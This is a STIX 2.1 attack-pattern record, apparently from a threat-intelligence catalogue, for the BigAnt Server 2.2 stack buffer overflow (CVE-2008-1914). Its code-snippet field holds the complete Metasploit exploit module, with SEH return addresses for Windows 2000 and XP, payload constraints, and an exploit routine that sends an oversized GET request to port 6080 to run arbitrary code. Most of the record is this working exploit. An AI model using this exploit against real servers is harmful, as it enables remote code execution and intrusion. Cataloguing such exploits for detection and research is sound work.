{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bb075909-242d-484b-adf7-bd644946ce7b",
    "created": "2024-08-14T16:45:56.972926Z",
    "modified": "2024-08-14T16:45:56.97293Z",
    "name": "BigAnt Server 2.2 Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in BigAnt Server 2.2. By sending a specially crafted packet, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/bigant_server.rb",
            "external_id": "bigant_server.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1914"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BigAnt Server 2.2 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in BigAnt Server 2.2.\n        By sending a specially crafted packet, an attacker may be\n        able to execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-1914' ],\n          [ 'OSVDB', '44454' ],\n          [ 'BID', '28795' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n          'DisableNops'  =>  'True',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 Pro All English',   { 'Ret' => 0x75022ac4 } ],\n          [ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2008-04-15'))\n\n    register_options([Opt::RPORT(6080)])\n  end\n\n  def exploit\n    connect\n\n    sploit =  \"GET \" + rand_text_alpha_upper(950) + generate_seh_payload(target.ret)\n    sploit << rand_text_alpha_upper(1024 - payload.encoded.length)\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit + \"\\n\\n\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-04-15",
    "x_mitre_platforms": [
        "win'"
    ]
}